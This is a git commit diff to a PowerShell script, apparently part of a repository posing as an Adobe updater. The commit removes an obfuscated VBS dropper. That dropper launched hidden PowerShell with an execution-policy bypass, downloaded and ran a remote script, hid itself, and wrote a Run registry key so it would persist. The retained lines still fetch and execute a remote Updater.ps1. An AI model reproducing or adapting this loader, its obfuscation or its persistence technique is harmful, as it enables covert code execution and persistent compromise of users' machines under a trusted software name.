d85c7696c4f1e9d2264ab037a3316302fd80e380
burnitup545 <96095116+burnitup545@users.noreply.github.com>
2022-01-04 15:58:37 -0800

    Update lib106.ps1
    Removed persistence steps

--- lib106.ps1
+++ lib106.ps1
@@ -37,23 +37,7 @@ finally
 
 $dricksjisx='https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'
 
-$VBS_f_ile = @'
-ksayewnds="SheLl"
-kcwowycp="ower"
-haugwloshbv=" -w hIdDen -eX"
-hctixwichs=" bYpaSs -c"
-
-
-
-aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" IE"+"X"+" ((n"+"ew-o"+"bje"+"ct n"+"et.w"+"ebc"+"li"+"ent).d"+"ownloa"+"dstr"+"ing('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib706.ps1'))"
-CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
-'@
 Start-Sleep -s 3
-Set-Content -Path $env:ProgramFiles\cu.vbs -Value $VBS_f_ile
-attrib +h “$env:ProgramFiles\cu.vbs”
-
-reg add “HKLM\Software\Microsoft\Windows\CurrentVersion\Run” /v AdobeUpdate /t REG_EXPAND_SZ /d “%ProgramFiles%\cu.vbs”
-
 
 IEX ((new-object net.webclient).downloadstring($dricksjisx))
 
